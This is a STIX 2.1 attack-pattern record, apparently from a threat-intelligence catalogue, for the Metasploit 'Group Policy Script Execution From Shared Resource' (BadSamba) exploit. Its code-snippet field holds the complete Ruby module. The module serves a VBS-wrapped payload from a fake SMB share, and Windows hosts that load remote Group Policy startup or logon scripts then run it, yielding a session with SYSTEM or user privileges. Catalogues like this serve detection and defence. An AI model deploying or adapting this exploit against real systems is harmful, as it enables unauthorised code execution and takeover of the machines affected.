{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4c8b1b4b-b0e1-459f-9fa9-fbedc9829580",
    "created": "2024-08-14T16:56:23.600553Z",
    "modified": "2024-08-14T16:56:23.600557Z",
    "name": "Group Policy Script Execution From Shared Resource",
    "description": " This is a general-purpose module for exploiting systems with Windows Group Policy configured to load VBS startup/logon scripts from remote locations. This module runs a SMB shared resource that will provide a payload through a VBS file. Startup scripts will be executed with SYSTEM privileges, while logon scripts will be executed with the user privileges. Have into account which the attacker still needs to redirect the target traffic to the fake SMB share to exploit it successfully. Please note in some cases, it will take 5 to 10 minutes to receive a session. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/group_policy_startup.rb",
            "external_id": "group_policy_startup.rb"
        },
        {
            "source_name": "reference",
            "url": "http://blog.gdssecurity.com/labs/2015/1/26/badsamba-exploiting-windows-startup-scripts-using-a-maliciou.html"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/GDSSecurity/BadSamba"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::SMB::Server::Share\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'          => 'Group Policy Script Execution From Shared Resource',\n      'Description'   => %q{\n        This is a general-purpose module for exploiting systems with Windows Group Policy\n        configured to load VBS startup/logon scripts from remote locations. This module runs\n        a SMB shared resource that will provide a payload through a VBS file. Startup scripts\n        will be executed with SYSTEM privileges, while logon scripts will be executed with the\n        user privileges. Have into account which the attacker still needs to redirect the\n        target traffic to the fake SMB share to exploit it successfully. Please note in some\n        cases, it will take 5 to 10 minutes to receive a session.\n      },\n      'Author'      =>\n        [\n          'Sam Bertram <sbertram[at]gdssecurity.com>', # BadSamba\n          'juan vazquez' # msf module\n        ],\n      'References'     =>\n        [\n          ['URL', 'http://blog.gdssecurity.com/labs/2015/1/26/badsamba-exploiting-windows-startup-scripts-using-a-maliciou.html'],\n          ['URL', 'https://github.com/GDSSecurity/BadSamba']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Privileged'     => false,\n      'Platform'       => 'win',\n      'Arch'           => [ARCH_X86, ARCH_X64],\n      'Payload'        =>\n        {\n          'Space'       => 2048,\n          'DisableNops' => true\n        },\n      'Targets'        =>\n        [\n          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],\n          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2015-01-26',\n      'Notes' =>\n          {\n              'AKA' => ['badsamba']\n          }\n    ))\n\n    register_options(\n      [\n        OptString.new('FILE_NAME', [ false, 'VBS File name to share (Default: random .vbs)'])\n      ])\n\n    deregister_options('FILE_CONTENTS')\n  end\n\n  def setup\n    super\n    self.file_name = datastore['FILE_NAME'] || \"#{Rex::Text.rand_text_alpha(4 + rand(3))}.vbs\"\n    @custom_payloads = {}\n    print_status(\"File available on #{unc}...\")\n  end\n\n  def on_client_connect(client)\n    super(client)\n\n    unless @custom_payloads[:client]\n      p = regenerate_payload(client)\n      exe = p.encoded_exe\n      @custom_payloads[client] = Msf::Util::EXE.to_exe_vbs(exe)\n    end\n  end\n\n  def get_file_contents(client:)\n    contents = @custom_payloads[client] || super(client: client)\n\n    contents\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-01-26",
    "x_mitre_platforms": [
        "win'"
    ]
}